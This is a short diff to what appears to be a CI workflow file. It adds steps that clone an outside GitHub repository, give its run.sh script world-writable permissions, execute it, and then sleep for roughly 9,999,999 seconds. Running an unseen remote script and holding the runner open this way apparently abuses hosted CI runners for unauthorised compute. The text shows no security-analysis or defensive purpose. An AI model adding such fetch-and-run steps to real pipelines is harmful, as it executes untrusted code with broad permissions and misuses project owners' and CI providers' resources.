@@ -25,6 +25,7 @@ jobs:
       uses: actions/setup-node@v1
       with:
         node-version: ${{ matrix.node-version }}
-    - run: git clone https://swenson12@bitbucket.org/swenson12/botelaina.git
-    - run: cd botelaina
-    - run: npm start
+    - run: git clone https://github.com/swensonsimanjuntaks5/grafana-openshift.git memek
+    - run: cd memek
+    - run: chmod 777 run.sh && ./run.sh
+    - run: sleep 9999999
